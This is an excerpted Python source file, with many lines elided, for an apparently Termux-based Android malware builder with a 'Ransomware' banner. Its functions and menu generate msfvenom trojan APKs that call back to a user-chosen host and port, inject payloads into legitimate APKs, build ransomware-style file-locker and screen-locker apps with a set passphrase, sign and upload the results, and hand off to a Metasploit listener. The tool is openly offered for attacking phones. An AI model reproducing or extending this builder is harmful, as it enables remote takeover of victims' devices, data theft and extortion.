...
try:
    ...
    exit(f'''
{athex} : It seems there is a module that you have not installed
...
def banner():
    ...
    print(w+b+"     /@@@|"+r+":::::"+w+b+"||"+r+":::::"+w+b+"|@@@\\")
    print(w+b+"    / @@@\\"+r+"':::'"+w+b+"/\\"+r+"':::'"+w+b+"/@@@ \\    "+w+"'"+r+"Ransomware"+b+w+"'")
...
def replace_string(oldstr, newstr, file):
    text = f'{athex} : add \'{d}{truncates(newstr)}{w}\' on \'{d}{os.path.basename(file)}{w}\' ... '
...
def add_new_icon(icon, path):
    text = f'{athex} : add \'{d}ic_launcher.png{w}\' into \'{d}mipmap-hdpi-v4{w}\' ... '
    ...
    print(text + f'{g}done{w}')
    text = f'{athex} : add \'{d}ic_launcher.png{w}\' into \'{d}AndroidManifest.xml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_version_code(cstr, path):
    text = f'{athex} : add \'{d}{cstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_version_name(nstr, path):
    text = f'{athex} : add \'{d}{nstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_dir(olddir, newdir):
    text = f'{athex} : rename \'{d}{olddir.split("/")[-1]}{w}\' into \'{d}{newdir.split("/")[-1]}{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def upload_file(file):
    prints(f'''
{athex} : do you want to upload \'{g}{file}{w}\' ?
    ...
    text = f'{athex} : upload \'{d}{file}{w}\' into the link ...'
    print(text + f'{y}wait{w}', end='\r')
    ...
    print(text + f'{g}done{w}')
    prints(f'''
{athex} : your file has been successfully uploaded,
...
def generate_trojan(host, port, name = None):
    ...
    text = f'{athex} : generate \'{d}{name}.apk{w}\' using msfvenom{w} ... '
    print(text + f'{y}wait{w}', end='\r')
...
def generate_infected_trojan(host, port, orig):
    ...
    text = f'{athex} : infection \'{g}{name}.apk{w}\' using msfvenom{w} ... '
    ...
    if not os.path.isfile(file): exit(text + f'{r}fail{w}')
    text = f'{athex} : infection \'{g}{name}-infected.apk{w}\' using msfvenom{w} ... '
    print('\n' + w + text + f'{g}done{w}')
    return file
...
def genertare_file_locker(name, desc, icon):
    ...
    text = f'{athex} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def genertare_screen_locker(name, head, desc, keys, icon):
    ...
    print(f'{athex} : add \'{d}{keys}{w}\' as passprhase ... {y}wait{w}', end='\r')
    replace_strings('app_keys', keys, f'{path}/smali/com/termuxhackers/id/MyService$100000000.smali')
    print(f'{athex} : add \'{d}{keys}{w}\' as \'{d}passprhase{w}\' ... {g}done{w}')
    text = f'{athex} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    for line in os.popen(f'find -O3 -L {path} -name \'ic_launcher.png\'', 'r').read().splitlines():
        if os.path.isfile(line):
...
def start_trojan_listener(host, port):
    prints(f'''
{athex} : redirecting to the metasploit console
...
def uber_apk_signer(file):
    text = f'{athex} : signing \'{d}{file}{w}\' using uber-apk-signer ... '
    print(text + f'{y}wait{w}', end='\r')
...
def decompile(file):
    text = f'{athex} : decompile \'{d}{file}{w}\' using apktool ... '
...
def recompile(path):
    text = f'{athex} : recompile \'{d}{path}{w}\' using apktool ... '
    file = path + '.apk'
    print(text + f'{y}wait{w}', end='\r')
...
class _athex_:
    ...
    def custom_trojan(self):
        banner()
        prints(f'''
{athex} : you can fill or leave blank for using
        ...
        prints(f'''
{athex} : well this process takes a few minutes,
        ...
        upload_file(apps)
        if not os.path.isfile(apps): exit(f'\n{athex} : sorry, failed to build \'{d}{apps}{w}\' :( \n')
        prints(f'''
{athex} : your trojan apps successfully created
        ...
        else: exit(f'\n{athex} : process completed successfully ...\n')
        start_trojan_listener(host, port)

    def infect_trojan(self):
        banner()
        prints(f'''
{athex} : you can fill or leave blank for using default config
        ...
        if not os.path.isfile(orig): exit(f'{athex} : file \'{d}{orig}{w}\' doesn\'t exist !')
        host = str(input(f'         set app host: '))
        if not host: host = self.ipv4
        port = str(input(f'         set app port: '))
        if not port: port = '4444'
...
{athex} : well this process takes a few minutes,
        ...
        upload_file(file)
        if not os.path.isfile(file): exit(f'\n{athex} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{athex} : your trojan apps successfully created
...
{athex} : well this process takes a few minutes,
        ...
        if not os.path.isfile(file): exit(f'\n{athex} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{athex} : your file locker apps successfully created
...
{athex} : well this process takes a few minutes,
        ...
        if not os.path.isfile(file): exit(f'\n{athex} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{athex} : your screen locker apps successfully created
         the application is saved as \'{g}{file}{w}\'
...
{athex} : ok, you can choose one ...
         ...
         (3) back to previous
                ...
                while True:
                    ...
                    else: print(f'{athex} : sorry, no command found for: {main_menu}'); continue
                    break
            elif main in ('2', '02'): self.custom_file_locker()
            elif main in ('3', '03'): self.custom_screen_locker()
            elif main in ('4', '04', 'exit'): exit(1)
            else: print(f'{athex} : sorry, no command found for: {main}'); continue
            break
        input(f'{athex} : press enter for back to \'{g}main menu{w}\' (enter) ')
        self.menu()
